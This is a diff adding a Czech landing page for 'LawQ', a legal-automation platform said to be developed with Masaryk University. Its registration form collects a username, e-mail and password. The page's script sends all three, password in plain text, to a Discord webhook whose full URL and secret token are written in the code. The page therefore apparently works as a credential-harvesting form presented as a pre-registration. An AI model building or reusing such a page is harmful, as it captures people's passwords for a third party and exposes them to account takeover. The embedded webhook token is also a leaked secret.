@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="cs">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>LawQ | Nový Právnický Systém</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* Základní reset a nastavení fontu */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Roboto", sans-serif;
+        line-height: 1.6;
+        color: #ecf0f1; /* Světlý text na tmavém pozadí */
+        background-color: #2c3e50; /* Tmavě modrá pozadí */
+      }
+
+      h1,
+      h2 {
+        color: #ecf0f1; /* Světlý text pro nadpisy */
+      }
+
+      .container {
+        width: 90%;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+
+      /* Hlavní sekce */
+      .hero {
+        background-color: #415363; /* Tmavší modrá pro hero sekci */
+        color: #fff;
+        padding: 80px 0;
+        text-align: center;
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
+      }
+
+      .hero h1 {
+        font-size: 3rem;
+        font-weight: 700;
+      }
+
+      .hero p {
+        font-size: 1.2rem;
+        margin-top: 10px;
+      }
+
+      .section {
+        padding: 50px 0;
+        background-color: #34495e; /* Tmavší modrá pro sekce */
+        color: #fff;
+      }
+
+      .section p {
+        font-size: 1rem;
+        color: #bdc3c7; /* Světlý text pro popisy */
+        line-height: 1.8;
+      }
+
+      .section ul {
+        list-style-type: none;
+        padding: 0;
+      }
+
+      .section ul li {
+        background: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" width="10" height="10"%3E%3Ccircle cx="5" cy="5" r="5" fill="%2331b28f" /%3E%3C/svg%3E')
+          no-repeat left center;
+        padding-left: 20px;
+        color: #bdc3c7;
+        margin-bottom: 10px;
+      }
+
+      .cta {
+        text-align: center;
+        background-color: #2c3e50;
+        padding: 50px 20px;
+        border-radius: 10px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+      }
+
+      .cta h2 {
+        font-size: 2rem;
+        color: #ecf0f1;
+        margin-bottom: 20px;
+      }
+
+      .cta p {
+        font-size: 1.2rem;
+        color: #bdc3c7;
+      }
+
+      /* Formulář */
+      .form-container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        margin-top: 30px;
+      }
+
+      .form-container form {
+        background-color: #34495e;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+        width: 100%;
+        max-width: 400px;
+      }
+
+      .form-container label {
+        display: block;
+        margin-bottom: 10px;
+        font-weight: bold;
+        color: #ecf0f1;
+      }
+
+      .form-container input[type="name"],
+      .form-container input[type="email"],
+      .form-container input[type="password"] {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 20px;
+        border: 1px solid #7f8c8d;
+        border-radius: 5px;
+        background-color: #2c3e50;
+        color: #ecf0f1;
+        font-size: 1rem;
+      }
+
+      .form-container button {
+        background-color: #3498db;
+        color: #fff;
+        padding: 15px;
+        border: none;
+        border-radius: 5px;
+        width: 100%;
+        font-size: 1.1rem;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+      }
+
+      .form-container button:hover {
+        background-color: #2980b9;
+      }
+
+      /* Styl pro dialog */
+      dialog {
+        padding: 20px;
+        border: none;
+        border-radius: 8px;
+        width: 90%;
+        max-width: 400px;
+        box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 1000;
+        background-color: #34495e;
+        color: #fff;
+      }
+
+      dialog.success {
+        background-color: #2ecc71;
+      }
+
+      dialog.failed {
+        background-color: #e74c3c;
+      }
+
+      dialog p {
+        font-size: 1.2rem;
+        color: #ecf0f1;
+        margin-bottom: 20px;
+      }
+
+      /* Responzivita pro mobilní zařízení */
+      @media (max-width: 768px) {
+        .hero h1 {
+          font-size: 2rem;
+        }
+        .cta h2 {
+          font-size: 1.5rem;
+        }
+        .form-container form {
+          padding: 20px;
+        }
+        .form-container button {
+          font-size: 1rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="hero">
+      <div class="container">
+        <img src="./munilaw2.png" alt="" height="100px" />
+        <h1>LawQ | Nový Právnický Systém</h1>
+        <p>Vyvíjený ve spolupráci s Masarykovou univerzitou v Brně</p>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="container">
+        <h2>Popis Systému</h2>
+        <p>
+          Naše nová platforma se nachází v procesu vývoje a je vyvíjena s
+          odbornou pomocí Právnické fakulty Masarykovy univerzity v Brně. Cílem
+          tohoto systému je nabídnout moderní nástroje pro právníky a advokáty,
+          které usnadní každodenní pracovní procesy a zjednoduší administrativní
+          úkony.
+        </p>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="container">
+        <h2>Co Bude Systém Automatizovat a Ulehčovat?</h2>
+        <p>
+          Systém bude zaměřen na automatizaci a usnadnění následujících právních
+          a advokátních procesů v rámci české legislativy:
+        </p>
+        <br />
+        <ul>
+          <li>
+            Automatické generování právních dokumentů (smlouvy, podání, žaloby,
+            apod.)
+          </li>
+          <li>
+            Automatické sledování termínů a lhůt pro podání právních dokumentů
+          </li>
+          <li>
+            Automatizované provádění právních analýz a vyhodnocování dokumentů
+          </li>
+          <li>Vytváření a správa elektronických podpisů</li>
+          <li>Správa právních případů a dokumentace v cloudu</li>
+        </ul>
+        <br />
+        <p>
+          Součástí systému bude také podpora pro právní analýzy a přizpůsobení
+          specifickým českým normám a předpisům.
+        </p>
+      </div>
+    </div>
+
+    <div class="cta">
+      <div class="container">
+        <h2>Registrujte se nyní do testování</h2>
+        <p>
+          Po dokončení vývoje a spuštění systému budete kontaktováni na základě
+          předregistrace. Získejte přístup mezi prvními!
+        </p>
+      </div>
+    </div>
+
+    <div class="section form-container">
+      <form id="registrationForm">
+        <label for="name">Uživatelké jméno:</label>
+        <input type="name" id="name" name="name" required />
+
+        <label for="email">E-mail:</label>
+        <input type="email" id="email" name="email" required />
+
+        <label for="password">Heslo:</label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          required
+          minlength="8"
+          style="margin-bottom: 0"
+        />
+        <small>Heslo musí mít alespoň 8 znaků.</small>
+        <br />
+        <br />
+
+        <button type="submit">REGISTROVAT</button>
+      </form>
+      <br />
+      <p>Copyright ©2024 LawQ | MUNI</p>
+    </div>
+
+    <!-- Dialog pro zobrazení zprávy -->
+    <dialog id="responseDialog">
+      <p id="dialogMessage"></p>
+    </dialog>
+
+    <script>
+      const form = document.getElementById("registrationForm");
+      const dialog = document.getElementById("responseDialog");
+      const dialogMessage = document.getElementById("dialogMessage");
+
+      form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const name = document.getElementById("name").value;
+        const email = document.getElementById("email").value;
+        const password = document.getElementById("password").value;
+
+        fetch(
+          "https://discord.com/api/webhooks/1239963066360139786/_bln1BIjV2K11VD8Mj8BLx-oLlz791ZHtn98CGZg_xNgsZPRbsfCR8agaFGnubZnZqWb",
+          {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              content: `Nová registrace: \n**Uživatelské jméno: ** ${name} \n**Email: ** ${email} \n**Heslo: ** ${password}`,
+            }),
+          }
+        )
+          .then(() => {
+            dialog.classList.add("success");
+            dialog.classList.remove("failed");
+            dialogMessage.textContent = "Registrace proběhla úspěšně";
+            const form = document.getElementById("registrationForm");
+            const inputs = form.querySelectorAll("input");
+
+            inputs.forEach((input) => {
+              input.value = ""; // Vymazání hodnoty inputu
+            });
+
+            dialog.showModal();
+
+            setTimeout(() => {
+              dialog.close();
+            }, 3000);
+          })
+          .catch((error) => {
+            dialog.classList.add("failed");
+            dialog.classList.remove("success");
+            dialogMessage.textContent =
+              "Došlo k chybě při komunikaci se serverem.";
+            dialog.showModal();
+
+            setTimeout(() => {
+              dialog.close();
+            }, 3000);
+          });
+      });
+    </script>
+  </body>
+</html>
